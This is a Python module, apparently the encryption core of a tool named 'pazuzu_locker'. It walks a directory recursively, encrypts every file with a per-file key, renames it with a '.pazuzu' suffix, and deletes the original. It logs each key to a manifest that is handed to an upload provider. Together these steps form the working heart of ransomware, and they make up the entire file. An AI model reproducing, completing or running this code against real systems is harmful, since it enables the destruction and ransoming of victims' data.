from __future__ import annotations

import base64
import csv
import logging
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable, Dict, List, Optional

from cryptography.fernet import Fernet

from pazuzu_locker.storage.provider import ManifestProvider, ProviderResult

logger = logging.getLogger("pazuzu_locker.encryption")


class EncryptionError(Exception):
    """Raised when encryption fails for a recoverable reason."""


@dataclass
class EncryptionStats:
    total_files: int = 0
    encrypted: int = 0
    skipped: int = 0
    failed: int = 0
    bytes_processed: int = 0
    errors: List[str] = field(default_factory=list)

    def as_dict(self) -> Dict[str, any]:
        return {
            "total_files": self.total_files,
            "encrypted": self.encrypted,
            "skipped": self.skipped,
            "failed": self.failed,
            "bytes_processed": self.bytes_processed,
            "errors": self.errors[:10],
        }


class EncryptionService:
    def __init__(
        self,
        *,
        target_dir: Path,
        manifest_path: Path,
        provider: ManifestProvider,
        dry_run: bool = False,
        progress_callback: Optional[Callable[[Path], None]] = None,
        files: Optional[List[Path]] = None,
    ):
        self.target_dir = target_dir
        self.manifest_path = manifest_path
        self.provider = provider
        self.dry_run = dry_run
        self.progress_callback = progress_callback
        self._files = files
        self.stats = EncryptionStats()

    def run(self) -> ProviderResult:
        if not self.target_dir.exists():
            raise EncryptionError(f"Target directory does not exist: {self.target_dir}")
        if not self.target_dir.is_dir():
            raise EncryptionError(f"Target path is not a directory: {self.target_dir}")

        logger.info(
            "Starting encryption in %s (manifest=%s, dry_run=%s)",
            self.target_dir,
            self.manifest_path,
            self.dry_run,
        )

        iterable = self._files if self._files is not None else self._walk_files(self.target_dir)
        for filepath in iterable:
            self.stats.total_files += 1
            if self.progress_callback:
                self.progress_callback(filepath)
            try:
                self._process_file(filepath)
            except Exception as exc:  # pragma: no cover - catch-all recovery
                logger.warning("Skipping %s: %s", filepath, exc)
                self.stats.failed += 1
                self.stats.errors.append(f"{filepath}: {exc}")

        if not self.dry_run:
            if self.stats.encrypted == 0:
                logger.warning("No files encrypted; no manifest written.")
                return ProviderResult(
                    provider="none",
                    destination=str(self.manifest_path),
                    metadata={"dry_run": False, "stats": self.stats.as_dict()},
                )
            result = self.provider.finalize_upload(self.manifest_path)
            logger.info("Encrypted %d files; manifest at %s", self.stats.encrypted, result.destination)
            return result

        logger.info("Dry run complete; %d files would be encrypted", self.stats.total_files)
        return ProviderResult(
            provider="none",
            destination=str(self.manifest_path),
            metadata={"dry_run": True, "stats": self.stats.as_dict()},
        )

    def _walk_files(self, root: Path):
        for entry in root.rglob("*"):
            if entry.is_file() and not entry.suffix == ".pazuzu":
                if entry.resolve() == self.manifest_path.resolve():
                    continue
                yield entry

    def _process_file(self, filepath: Path):
        if not filepath.exists():
            self.stats.skipped += 1
            return
        try:
            key = Fernet.generate_key()
            original_data = filepath.read_bytes()
            encrypted_data = Fernet(key).encrypt(original_data)
            encrypted_path = filepath.with_suffix(filepath.suffix + ".pazuzu")

            if self.dry_run:
                logger.debug("[DRY-RUN] Would encrypt %s -> %s", filepath, encrypted_path)
                self.stats.encrypted += 1
                self.stats.bytes_processed += len(original_data)
                return

            encrypted_path.write_bytes(encrypted_data)
            self._log_to_manifest(encrypted_path, key)
            filepath.unlink()
            self.stats.encrypted += 1
            self.stats.bytes_processed += len(original_data)

        except PermissionError:
            logger.debug("Permission denied: %s", filepath)
            self.stats.skipped += 1
        except OSError as exc:
            logger.debug("OS error on %s: %s", filepath, exc)
            self.stats.skipped += 1

    def _log_to_manifest(self, filepath: Path, key: bytes):
        self.manifest_path.parent.mkdir(parents=True, exist_ok=True)
        key_b64 = base64.b64encode(key).decode("utf-8")
        with self.manifest_path.open(mode="a", newline="", encoding="utf-8") as handle:
            writer = csv.writer(handle)
            writer.writerow([str(filepath), key_b64])
